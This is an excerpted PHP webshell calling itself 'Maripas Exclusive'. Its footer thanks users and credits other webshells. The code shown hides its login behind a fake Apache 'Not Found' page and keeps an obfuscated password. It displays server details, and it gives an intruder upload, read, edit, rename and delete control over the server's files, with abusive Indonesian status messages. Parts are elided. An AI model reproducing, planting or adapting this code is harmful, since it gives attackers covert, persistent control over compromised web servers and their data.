...
$auth_pass = $wlsb("k", "", "5dk283b0dk9c7f29f95ce56b274k04af9ck9");
function printLogin() { 
    ?> 
<h1>Not Found</h1> 
...
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> </address> 
...
<style type="text/css">
html {
    background: url(https://i.ibb.co/WGXrVq6/giphy.gif) no-repeat center center fixed;
...
Maripas Exclusive</h1></a>
<BODY>';
echo "<center><hr><font color='white'>
<i class='fa fa-user'></i> <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<hr>
<font color='white'>
<i class='fa fa-desktop'></i> <td>: <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']."<hr><font color='white'>
<i class='fa fa-hdd-o'></i> <td>: <font color='lime'>".php_uname()."</font><hr>
</table>";
...
echo '<br><br><font color="lime">Berhasil Upload Ngen</font><br/>';
}else{
echo '<script>alert("gabisa di upload kontol")</script>';
}
}
...
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <textarea  style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1200px;" readonly> '.htmlspecialchars(url_get_contents($_GET['filesrc'])).'</textarea>');
...
<input type="hidden" name="opt" value="hapus">
...
if(rename($_POST['path'],$path.'/'.$_POST['nama baru'])){
echo '<br><br><font color="lime">GANTI NAMA SUKSES ANJING</font><br/>';
}else{
echo '<script>alert("Gabisa Diubah su")</script>';
}
...
echo '<br><br><font color="lime">EDIT BERHASIL YA SU</font><br/>';
}else{
echo '<script>alert("Edit File Gagal Babi!!")</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(url_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
	echo '<br><br><font color="lime">HAPUS DIR SUKSES</font><br/>';
}else{
...
echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:transparent;color:lime;border:2px solid lime;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
...
?>
<br>
<font size="3px"> Dedicated to j, bk, dk, nr, rut, dv, jon, rz, zy, 404, ltf, d, sk, c4 and you, yes you! Thank you for using this webshell. Credits: Marijuana, WSO, and Alfa for inspiring us.
OS: *nux, mac, Win* - Tech: PHP5.3+, Python2.7+, Perl, Codemirror, jQuery, Stackoverflow, Cloudflare, All CVE's Master, and Github! - Softwarez: Cloud9, Sublime, and MSEdge!</font>
